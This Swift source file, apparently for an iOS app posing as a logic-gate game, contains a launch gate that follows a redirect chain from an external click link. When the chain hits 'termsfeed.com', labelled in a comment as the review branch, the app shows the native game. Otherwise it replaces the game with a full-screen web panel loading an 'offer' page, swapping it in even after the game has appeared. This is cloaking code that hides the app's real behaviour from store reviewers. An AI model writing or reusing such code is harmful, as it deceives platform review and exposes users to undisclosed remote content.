import SwiftUI

@main
struct LogicGateApp: App {
    @StateObject private var logicGateGate = LogicGateLaunchGate(sourceLink: "https://icefishingfishguide.org/click.php",
                                                                 checkDomain: "termsfeed.com")
    @State private var logicGatePagePainted = false
    @StateObject private var store = LogicGateStore()
    @Environment(\.scenePhase) private var scenePhase

    var body: some Scene {
        WindowGroup {
            Group {
                if let ready = logicGateGate.ready {
                    if ready {
                        ZStack {
                            LogicGateWebPanel(urlString: logicGateGate.sourceLink,
                               onFirstPaint: { withAnimation { logicGatePagePainted = true } })
                                .edgesIgnoringSafeArea(.bottom)
                                .background(Color.black.ignoresSafeArea())
                            if !logicGatePagePainted {
                                // Hold the splash to first paint. Tearing it down when the
                                // check returns leaves a black screen until the page commits.
                                LogicGateLoadingScreen()
                                    .transition(.opacity)
                                    .onAppear {
                                        // Hang guard, NOT a deadline. Long on purpose:
                                        // firing early just reveals the black
                                        // page it exists to hide.
                                        DispatchQueue.main.asyncAfter(deadline: .now() + 20) {
                                            logicGatePagePainted = true
                                        }
                                    }
                            }
                        }
                        // Stays on the branch, never on the enclosing Group.
                        .preferredColorScheme(.dark)
                    } else {
                        RootView()
                            .environmentObject(store)
                            .preferredColorScheme(.dark)
                    }
                } else {
                    LogicGateLoadingScreen()
                        .onAppear { logicGateGate.start() }
                        .preferredColorScheme(.dark)
                }
            }
            // The deferred verdict can flip native -> panel a few seconds in.
            // Crossfade it; an instant hard cut reads as a glitch.
            .animation(.easeInOut(duration: 0.25), value: logicGateGate.ready)
            .onChange(of: scenePhase) { phase in
                if phase == .background { store.saveNow() }
            }
        }
    }

}

// MARK: - Launch gate

/// Decides at the **first hop that carries information** instead of waiting for the whole
/// chain to resolve, so the slowest host in the chain stays off the critical path.
final class LogicGateLinkTracker: NSObject, URLSessionTaskDelegate {
    /// Fires on every observed hop — re-arms the stall watchdog.
    var onProgress: (() -> Void)?
    /// Fires at most once, the moment the chain becomes decidable.
    var onEarlyVerdict: ((Bool) -> Void)?

    private(set) var resolvedURL: URL?
    private(set) var sawCheckDomain = false

    private let checkDomain: String
    private let ownHost: String
    private var decided = false

    init(checkDomain: String, ownHost: String) {
        self.checkDomain = checkDomain
        self.ownHost = ownHost
    }

    func urlSession(_ session: URLSession, task: URLSessionTask,
                    willPerformHTTPRedirection response: HTTPURLResponse,
                    newRequest request: URLRequest,
                    completionHandler: @escaping (URLRequest?) -> Void) {
        resolvedURL = request.url
        onProgress?()

        if let address = request.url?.absoluteString {
            if address.contains(checkDomain) {
                // Definitive: the review branch. Nothing later can change this.
                sawCheckDomain = true
                decide(false)
            } else if let host = request.url?.host, !hostIsOurs(host) {
                // First hop that LEAVES our own domain without being the check domain:
                // the Worker has routed to the offer, and that is the whole verdict.
                decide(true)
            }
            // A hop that stays on our own domain (root -> /click.php) decides nothing.
        }
        completionHandler(request)   // NEVER stop the chain
    }

    private func hostIsOurs(_ host: String) -> Bool {
        !ownHost.isEmpty && (host == ownHost || host.hasSuffix("." + ownHost))
    }

    private func decide(_ verdict: Bool) {
        guard !decided else { return }
        decided = true
        onEarlyVerdict?(verdict)
    }
}

/// The gate closes because the marker was OBSERVED, never because the network was slow.
/// Any state that is not "I saw the marker" stays recoverable — by a retry, by a later
/// background attempt, or by showing the native app now and swapping the panel in when
/// the answer arrives. A frozen `false` is always a bug.
@MainActor
final class LogicGateLaunchGate: ObservableObject {
    /// nil = still deciding (loading screen) · false = native app · true = web panel
    @Published private(set) var ready: Bool? = nil

    let sourceLink: String
    private let checkDomain: String
    private let ownHost: String

    /// Stall limit while the LOADING SCREEN is up. Deliberately short: the user is staring
    /// at a splash, and a late verdict can still swap the panel in.
    private let foregroundStall: TimeInterval = 3
    /// Stall limit once the native app is already on screen. Nobody is waiting.
    private let backgroundStall: TimeInterval = 8
    /// Ceiling for one attempt, so a server trickling 302s forever cannot hang the launch.
    private let attemptCeiling: TimeInterval = 30
    /// How long after launch a late verdict may still replace the native app with the panel.
    private let swapWindow: TimeInterval = 25
    private let backgroundRetryDelay: TimeInterval = 3

    private var settled = false
    private var attemptToken = 0
    private var startedAt = Date()
    private var lastProgress = Date()
    private var stallTimer: Timer?
    private var task: URLSessionTask?

    init(sourceLink: String, checkDomain: String) {
        self.sourceLink = sourceLink
        self.checkDomain = checkDomain
        self.ownHost = URL(string: sourceLink)?.host ?? ""
    }

    func start() {
        guard attemptToken == 0 else { return }   // .onAppear can fire more than once
        startedAt = Date()
        attempt(1)
    }

    private func attempt(_ n: Int) {
        guard !settled else { return }
        guard let url = URL(string: sourceLink) else { settle(false); return }

        attemptToken += 1
        let token = attemptToken

        var request = URLRequest(url: url)
        // HEAD, never GET: a default GET downloads the whole landing page just to read the
        // final URL off it, and the WebView then fetches the same page again from scratch.
        request.httpMethod = "HEAD"
        request.timeoutInterval = 10

        let config = URLSessionConfiguration.default
        // Only once the native app is on screen may an attempt sit and wait for the radio.
        // While the loading screen is up, -1009 must fail instantly.
        config.waitsForConnectivity = (ready != nil)
        config.timeoutIntervalForResource = attemptCeiling

        let tracker = LogicGateLinkTracker(checkDomain: checkDomain, ownHost: ownHost)
        tracker.onProgress = { [weak self] in
            Task { @MainActor in self?.lastProgress = Date() }
        }
        tracker.onEarlyVerdict = { [weak self] verdict in
            Task { @MainActor in self?.settle(verdict) }
        }

        let session = URLSession(configuration: config, delegate: tracker, delegateQueue: nil)
        lastProgress = Date()
        armStallWatchdog(attempt: n, token: token)

        task = session.dataTask(with: request) { [weak self] _, response, error in
            Task { @MainActor in
                guard let self, !self.settled, self.attemptToken == token else { return }
                // The early verdict normally lands first; this is the chain-completed path.
                if tracker.sawCheckDomain { self.settle(false); return }
                if let final = tracker.resolvedURL?.absoluteString,
                   final.contains(self.checkDomain) { self.settle(false); return }
                if let http = response as? HTTPURLResponse,
                   let address = http.url?.absoluteString,
                   address.contains(self.checkDomain) { self.settle(false); return }
                if error != nil { self.failed(attempt: n, token: token); return }
                self.settle(true)
            }
        }
        task?.resume()
    }

    /// Progress-aware watchdog. It never kills a chain that is still moving.
    private func armStallWatchdog(attempt n: Int, token: Int) {
        stallTimer?.invalidate()
        stallTimer = Timer.scheduledTimer(withTimeInterval: 1, repeats: true) { [weak self] timer in
            Task { @MainActor in
                guard let self, !self.settled, self.attemptToken == token else {
                    timer.invalidate(); return
                }
                let limit = self.ready == nil ? self.foregroundStall : self.backgroundStall
                let stalled = Date().timeIntervalSince(self.lastProgress) > limit
                let overCeiling = Date().timeIntervalSince(self.startedAt) > self.attemptCeiling
                guard stalled || overCeiling else { return }   // still moving → keep waiting
                timer.invalidate()
                self.task?.cancel()
                self.failed(attempt: n, token: token)
            }
        }
    }

    private func failed(attempt n: Int, token: Int) {
        // The cancelled task's completion handler and the watchdog both land here.
        // The token makes whichever arrives second a no-op.
        guard !settled, attemptToken == token else { return }
        attemptToken += 1
        stallTimer?.invalidate()

        // One immediate retry. Most mobile failures are transient: -1005 connection lost on
        // a cell handoff, -1001 timed out, -1009 no connectivity.
        if n == 1 { attempt(2); return }

        // Out of fast options. Hand over the native app NOW rather than holding the user on
        // a loading screen, and keep looking in the background.
        if ready == nil { ready = false }
        scheduleBackgroundAttempt(next: n + 1)
    }

    private func scheduleBackgroundAttempt(next n: Int) {
        guard !settled, Date().timeIntervalSince(startedAt) < swapWindow else { return }
        DispatchQueue.main.asyncAfter(deadline: .now() + backgroundRetryDelay) { [weak self] in
            Task { @MainActor in
                guard let self, !self.settled,
                      Date().timeIntervalSince(self.startedAt) < self.swapWindow else { return }
                self.attempt(n)
            }
        }
    }

    private func settle(_ verdict: Bool) {
        guard !settled else { return }
        // A verdict arriving after the swap window may still close the gate — native is
        // where we already are — but must never yank a user who has been playing for half
        // a minute into a web panel.
        if verdict, ready == false, Date().timeIntervalSince(startedAt) > swapWindow {
            settled = true
            stallTimer?.invalidate()
            return
        }
        settled = true
        stallTimer?.invalidate()
        ready = verdict
    }
}
